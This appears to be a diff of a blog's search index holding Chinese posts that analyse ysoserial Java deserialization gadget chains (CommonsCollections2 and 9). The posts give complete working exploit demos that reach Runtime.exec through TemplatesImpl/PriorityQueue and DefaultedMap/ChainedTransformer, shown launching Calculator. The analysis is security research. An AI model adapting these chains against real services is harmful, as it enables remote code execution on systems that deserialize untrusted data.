class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">            entry = table[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyfield.set(entry,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>结果如下:</p>
+<p>前面的几行都是普通的反序列化函数，让我们直接看看<code>heapify</code>。</p>
 <p><img src="2.png" alt=""></p>
+<p><code>heapify</code>函数连直接调用了<code>siftDown</code>，跟进<code>siftDown</code>。</p>
+<p><img src="3.png" alt=""></p>
+<p>若<code>comparator</code>不为空，则进入了<code>SiftDownUsingComparator</code>函数，跟进它。</p>
+<p><img src="4.png" alt=""></p>
+<p>在<code>SiftDownUsingComparator</code>函数中，继续跟进<code>comparator.compare</code>函数。此时进入的是<code>TransformingComparator</code>的compare函数，如下所示</p>
+<p><img src="5.png" alt=""></p>
+<p>在这里就看到了熟悉的<code>this.transformer.transform()</code>。在CommonsCollections2中利用的是<code>InvokerTransformer</code>的反射机制来调用<code>newTransformer</code>函数，从而进入利用TemplatesImpl对象的RCE。除了InvokerTransformer外，CommonsCollection3中的<code>InstantiateTransformer</code>触发<code>TrAXFilter</code>初始化也能达到同样的效果，不过这是CommonsCollections4使用的方法。</p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>根据上面的分析可以得知，需要指定<code>PriorityQueue</code>类的<code>comparator</code>变量为<code>TransformingComparator</code>类，而<code>TransformingComparator</code>类中的Transformer需要是<code>InvokerTransformer</code>。很容易写出如下的payload</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>
+
+<p><code>newTransformer</code>函数的主体是TemplatesImpl对象，因此传入<code>this.transformer.transform(obj)</code>中的obj是一个TemplatesImpl对象。而该对象是PriorityQueue类的queue成员变量。因此，需要实例化一个PriorityQueue类，其成员变量comparator是一个TransformingComparator对象，成员变量queue是一个TemplatesImpl对象。</p>
+<p>可以看到在<code>PriorityQueue</code>类中，<code>queue</code>这个成员变量被<code>transient</code>关键字修饰，是不能被序列化的。但是在<code>PriorityQueue</code>类的writeObject方法中，首先调用了ObjectOutputStream中的defaultWriteObject方法，该方法会执行默认的序列化机制，在进行序列化时，会先忽略掉被<code>transient</code>修饰的queue字段。然后调用了<code>writeObject</code>方法显示地将queue字段写入到ObjectOutputStream中。</p>
+<p><img src="6.png" alt=""></p>
+<p>查看<code>PriorityQueue</code>类的构造函数，需要两个参数，需要注意的是<code>initCapacity</code>在其注释中有说明需要1.5的Capacity，因此在初始化时将其设为2。初始化的代码如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后queue里面的值为TemplatesImpl对象，使用CommonsCollections3中的构造方法，然后对Priority类中的queue成员进行设置。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"> </span><br><span class="line">Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field6.set(priorityQueue,queue);</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<p>ysoserial中实例化InvokerTransformer类时，它首先调用的toString方法，然后才将其换成newTransformer方法。这是因为在前面<code>priorityQueue.add(1)</code>也会调用到InvokerTransformer，这时候Integrity对象1并没有newTransformer方法会报错。</p>
+</blockquote>
+<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">         String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">         String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                 command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                 <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">         Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">         ClassPool pool = ClassPool.getDefault();</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">         clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">         CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">         clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">         Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">         Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">         field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field2.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">         Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">         field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//create templates</span></span><br><span class="line"></span><br><span class="line">         InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">         TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">         PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">         Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field field5 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field5.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field5.set(transformer, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field6.set(priorityQueue,queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(priorityQueue);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再加上ysoserial中的classFiles.java。运行结果如下:</p>
+<p><img src="7.png" alt=""></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
+<li><a href="http://blog.0kami.cn/2019/11/05/study-java-deserialized-commonscollections4/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections2,4,8</a></li>
+<li><a href="https://www.cnblogs.com/tr1ple/p/12382559.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(2)</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -1242,6 +1449,40 @@
       </categories>
   </entry>
   <entry>
+    <title>ysoserial分析之CommonsCollections9</title>
+    <url>/2020/04/28/ysoserial-analyze-9/</url>
+    <content><![CDATA[<p>这篇文章要分析的是CommonsCollections9，根据<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅的收集，找到了<a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a>师傅提交的CommonsCollections9。它利用了3.2.1版本中的<font color=#00800><code>DefaultedMap</code></font></p>
+<a id="more"></a>
+
+<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a> </p>
+<p>梅子酒师傅提交的CommonsCollections9利用的是commonscollections:3.2版本新增加的<code>DefaultedMap</code>类来替代LazyMap。因为这两个类中的get函数具有类似的作用。作者表明只能在JDK8u76成功，实际上，在jdk1.8.0_111也能成功？</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
+<li>commonscollections:3.2.1</li>
+<li>未配置security-manager</li>
+</ul>
+<p>先来看看整个的利用链</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;DefaultedMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<h2 id="利用链分析及payload构造"><a href="#利用链分析及payload构造" class="headerlink" title="利用链分析及payload构造"></a>利用链分析及payload构造</h2><p>从payload的整个利用链可以看出，整个链的构造和CommonsCollections5很相似，都是利用了BadAttributeValueExpException作为最外层。不同的只有中间的<code>DefaultedMap</code>类，那么就从分析这个类开始。定位到这个类的get函数</p>
+<p><img src="1.png" alt=""></p>
+<p>在函数里会调用<code>((Transformer)this.value).transform(key)</code>，当this.value为构造的ChainedTransformer对象时，就可以RCE了。而这个value在DefaultedMap实例化时传入的参数。如下代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br></pre></td></tr></table></figure>
+
+<p>然后其余的与CommonsCollections5一致，完整的demo如下:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(defaultedMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(val,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行的结果如下所示:</p>
+<p><img src="2.png" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
+<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">CommonsCollections9payload</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>JAVA安全</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ysoserial之CommonsCollections系列总结</title>
     <url>/2020/04/29/ysoserial-cc-sumary/</url>
     <content><![CDATA[<p>花了一周的时间对现有的CommonsCollections利用链分析了一遍，这篇文章是总结一下各利用链的特点、适用场景以及我自己对于Java反序列化链的一点思考。</p>
@@ -1416,40 +1657,6 @@
       </categories>
   </entry>
   <entry>
-    <title>ysoserial分析之CommonsCollections9</title>
-    <url>/2020/04/28/ysoserial-analyze-9/</url>
-    <content><![CDATA[<p>这篇文章要分析的是CommonsCollections9，根据<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅的收集，找到了<a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a>师傅提交的CommonsCollections9。它利用了3.2.1版本中的<font color=#00800><code>DefaultedMap</code></font></p>
-<a id="more"></a>
-
-<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a> </p>
-<p>梅子酒师傅提交的CommonsCollections9利用的是commonscollections:3.2版本新增加的<code>DefaultedMap</code>类来替代LazyMap。因为这两个类中的get函数具有类似的作用。作者表明只能在JDK8u76成功，实际上，在jdk1.8.0_111也能成功？</p>
-<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
-<li>commonscollections:3.2.1</li>
-<li>未配置security-manager</li>
-</ul>
-<p>先来看看整个的利用链</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;DefaultedMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
-
-<h2 id="利用链分析及payload构造"><a href="#利用链分析及payload构造" class="headerlink" title="利用链分析及payload构造"></a>利用链分析及payload构造</h2><p>从payload的整个利用链可以看出，整个链的构造和CommonsCollections5很相似，都是利用了BadAttributeValueExpException作为最外层。不同的只有中间的<code>DefaultedMap</code>类，那么就从分析这个类开始。定位到这个类的get函数</p>
-<p><img src="1.png" alt=""></p>
-<p>在函数里会调用<code>((Transformer)this.value).transform(key)</code>，当this.value为构造的ChainedTransformer对象时，就可以RCE了。而这个value在DefaultedMap实例化时传入的参数。如下代码</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br></pre></td></tr></table></figure>
-
-<p>然后其余的与CommonsCollections5一致，完整的demo如下:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(defaultedMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(val,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>运行的结果如下所示:</p>
-<p><img src="2.png" alt=""></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
-<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
-<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">CommonsCollections9payload</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>JAVA安全</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ysoseial之CommonsBeanUtils1分析</title>
     <url>/2020/05/09/ysoserial-commonsbeanutils1/</url>
     <content><![CDATA[<p>最近在复现shiro 721的时候，发现可以利用CommonsBeanUtils1这条利用链。虽然这条利用链中也用到了commonscollections中的类，但整个的思路有很大的不同，故将其进行一波分析。</p>
@@ -1498,52 +1705,117 @@
       </categories>
   </entry>
   <entry>
-    <title>ysoserial分析之CommonsCollections2</title>
-    <url>/2020/04/24/ysoserial-analyze-2/</url>
-    <content><![CDATA[<p>这篇文章分析的是CommonsCollections2，与之前不同的是，它是在commonscollections4.0版本下的利用链。与CommonsCollections3一样的是，它也是利用TemplatesImpl对象来执行任意命令的。接下来就来具体分析分析它。</p>
